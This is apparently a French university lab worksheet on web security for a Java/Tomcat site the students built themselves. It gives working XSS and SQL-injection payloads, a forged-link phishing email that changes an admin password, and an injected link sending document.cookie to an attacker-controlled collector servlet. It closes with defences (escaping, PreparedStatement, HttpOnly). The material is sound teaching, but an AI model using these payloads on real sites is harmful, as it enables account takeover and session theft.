
# Sécurité des sites web

**Objectifs :**
- Comprendre les principes de base et savoir se protéger contre l'injection XSS et l'injection SQL

**Avertissement**  
TESTER LA VULNÉRABILITÉ D'UN SITE QUI N'EST PAS LE VÔTRE EST ILLEGAL  
NE RÉALISEZ CES EXERCICES QUE SUR VOS PROPRES SITES

## Préambule
Afin de pouvoir effectuer des tests de "piratage" interessants, il est nécessaire d'avoir une application qui nécessite une authentification
et une gestion de rôles, qui permet de saisir des données et d'afficher d'une manière ou d'une autre les données saisies. C'est le cas à l'issue de l'exercice précédant.

### Déploiement
1. Tomcat arrêté, récupérer et décompresser le fichier `tp309.zip`
1. Quelle commande Unix permet de savoir dans quelles pages sont réalisées les connexions ?
1. Quelle commande Unix permet de remplacer le nom de l'utilisateur par le votre ?
1. Sans éditer aucun fichier, modifiez l'ensemble des pages de manière à bien régler le driver, l'url, le login, le mot de passe nécessaires au bon fonctionnement
de ce site.
1. N'oubliez pas de créer la table et les données nécessaires (voir le `README`associé) et compiler les servlets !

## Injection XSS
L'injection XSS (HTML ou Javascript) peut se faire partout où l'utilisateur saisit des données. Cela perturbera toute page qui
affichera le contenu de cette saisie, par exemple quand l'utilisateur modifie ses coordonnées. En tant que jean, saisir par exemple dans le champs adresse tour à tour les données suivantes.

Vérifiez dans chacun de ces cas, les conséquences sur la page d’affichage des données d’un administrateur : c'est jean qui saisit, c'est paul qui subit !
1. `<h1>HACK</h1>`
1. `<font size=7 color=red>HACK</font>`
1. `<script>alert("HACK")</script>`
1. `<script>window.open("Select")</script>`
Firefox limite depuis la version 57.0 le nombre de popups. Lors de l’appel, cliquez sur le bouton preferences pour autoriser les popups.
1. `<script>location="http://www.libe.fr"</script>`
Dans ce dernier cas, vous constatez que plus aucun admin ne verra sa page d’affichage !

## Injection SQL
L’injection SQL peut se faire dans toute donnée qui sera manipulée par une instruction SQL, ce qui est le cas de tout formulaire d’authentification.
1. Saisir dans les deux champs login et mdp `' OR '1'='1`
Vous constatez que l’on se connecte au site avec le login du 1er utilisateur de la base, qui est en général l’administrateur !!
1. Saisir dans le champs login `' union select 'x','x','x','x','admin','x' --` (des x pour chaque colonne qui n’est pas un rôle, le reste en commentaire)
Vous constatez que l’on “force” la connexion à un role spécifique (ici admin !!).
1. Saisir dans le champs login un login correct, mais sous la forme `unbonlogin' or '1'='1` , puis n'importe quoi dans le champs mot de passe.  
Vous constatez que l'on se connecte sans le mot de passe en tant que l'utilisateur choisi.
1. Créez une table `bidon(libelle text)` avec quelques lignes dedans. Trouvez l'injection à effectuer au login pour effacer
complètement cette table par injection SQL
1. Vous êtes un nouvel utilisateur. Comment faire pour être directement inscrit à la création avec un compte admin inscrit
physiquement dans la base ?
1. Vous avez un compte sur ce site en tant que simple utilisateur. Comment modifier votre rôle pour passer de util à admin
dans la base.

## Social engineering
L'ingénierie sociale est une forme d'escroquerie utilisée en informatique pour obtenir d'autrui des informations clefs. Cette
pratique exploite les failles humaines et sociales, la crédulité des personnes possédant ce que l'on cherche à obtenir.

* L'administrateur est connecté
* Un pirate lui envoie un email en html en apparence anodin. Pour tester, envoyez vous un email contenant le texte :  
  ```html
  Peux tu jeter un oeil sur ma page perso
  <p>
  <a href=http://localhost:8080/tp309/servlet/Maj2?login=paul&mdp=toto&nom=&prenom=&adresse=>
  http://127.12.56.33/mapageperso.html</a>
  <p>
  Merci
  ```
* En tant qu'administateur paul, vous ne vous méfiez pas, et en recevant le mail, vous cliquez naïvement dessus.
* Ce faisant, paul vient de changer son mot de passe en toto, mot de passe que vous lui avez indiqué dans la partie cachée du lien.
* Le pirate peut maintenant se logger en paul/toto

## Le vol de sessions
Dans cet exercice nous allons voir comment se logguer sur un site en utilisant la session d'un autre utilisateur, sans saisir aucun
login ni mot de passe ! C'est ce que l'on appelle un vol de session.
1. Nous utiliserons Chrome pour l'administrateur (ici paul/paul) et Firefox/Iceweasel pour le "voleur" (ici jean/jean)
qui est simple utilisateur. Lancez les deux et recadrez ces fenetres pour qu'elles soient côte à côte : Chromium à gauche,
Firefox à droite.
1. Les navigateurs récents possèdent tous une "console web". Cet outil permet d'éditer, débugguer, tester CSS, HTML, et JavaScript en direct sur n'importe quelle page. Sur Firefox allez dans "Outils/Developpement web" puis "console web" onglet "storage"
1. Tout est maintenant prêt pour la démonstration
1. Un voleur (navigateur de droite), jean, non administrateur, injecte dans ses coordonnées (via "modifier vos infos") le code  
    ```javascript
    <script>alert(document.cookie)</script>
    ```
1. Paul (navigateur de gauche), administrateur, se connecte légalement avec son login/mdp sur le navigateur de gauche ... mais
il laisse sa session ouverte en allant boire un café :-(
1. Jean, le voleur en profite pour utiliser son navigateur et afficher la liste des coordonnées. L'affichage de cette page lui donne le `JSESSIONID`. Faites un copier du numéro.
1. Jean, le voleur retourne sur son navigateur Firefox qu'il lance sur la page de Menu
1. Avec la console Web  (Outils - Dev Web - Console Web), il va dans l'onglet `Stockage` et modifie l'identifiant de session en mettant celui volé précédemment.
1. Après un reload de cette page, il est maintenant connecté comme administrateur !


## Industrialiser les vols de sessions
Certains pirates injectent dans les pages WEB des forums des liens permettant de voler vos cookies et les ranger dans leurs bases
de données
1. Ecrire dans vide (pas dans `tp309` pour symboliser un autre serveur; celui du voleur) une servlet `Voler.java` qui récupere
un parametre `p` et le range dans une table `numsessions(p text)`.
1. Injecter dans le site (page "Modifiez vos infos") le code suivant dans le champs adresse 2 :  
    ```html
    <a href="#" onclick="window.location=''http://mamachine:8080/vide/servlet-Voler?p=''+
    escape(document.cookie)">Cliquer ici!</a>
    ```
1. Demandez maintenant à vos voisins d'afficher cette page et de cliquer sur le lien
1. A chaque click d'un utilisateur, son numéro de session vient remplir votre table de sessions volées. Il ne vous reste plus qu'à laisser ce piège toute la nuit, demain matin, votre BDD sera pleine de cookies tous frais ;-)


Remarque : Les cookies sont accessibles coté client via les langages de Script comme Javascript. Le tag `HttpOnly` empêche d’accéder aux cookies par Javascript. Pour se protéger il est préférable soit d'utiliser la méthode `setHttpOnly`à la création du cookie, soit de paramétrer son serveur avec des `HttpOnly` cookies.



## Mise en sécurité "élémentaire" du site
1. Afin d'éviter l'injection XSS une technique basique et inefficace consiste à faire des replaceAll sur les chaines de caractères pour supprimer les caractères spéciaux `<>'()`. Testez cette approche sur le paramètre adresse.
1. Testez la saisie de Villeneuve d'Ascq dans l'adresse
1. La classe `StringEscapeUtils` des API `Commons-text` et `Commons-lang` de chez [Apache](http://commons.Apache.org) est bien plus efficace puisqu'elle "encode" les caractères spéciaux ainsi que ceux supérieurs au code ascii 127.
  * Ecrire un programme Java simple qui saisit une chaine et affiche sa transformation avec la méthode `translate` de
la classe `StringEscapeUtils`  
    ```java
    CharSequenceTranslator cst = StringEscapeUtils.ESCAPE_HTML4;  
    String translated=cst.translate(input);
    ```
  * Testez avec différentes chaines contenant des caractères spéciaux(genre `<h1>hello</h1>`)
  * Modifiez votre site en conséquence.
  * Testez la saisie de Villeneuve d'Ascq dans l'adresse
1. Afin d'évitez l'injection SQL, remplacez les Statement utilisés à partir de données saisies par des `PreparedStatement` avec setters
1. Restestez toutes les injections vues lors des précédents exercices et testez que toute forme de piratage est désormais impossible.

